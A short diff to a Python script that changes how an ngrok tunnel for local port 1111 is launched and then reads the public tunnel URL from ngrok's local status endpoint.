@@ -316,7 +316,7 @@ def runServeo():
     print("\n")
 
 def runNgrok():
-    system('./Server/ngrok http 1111 > /dev/null &')
+    system('ngrok http 1111 > /dev/null &')
     while True:
         sleep(2)
         system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
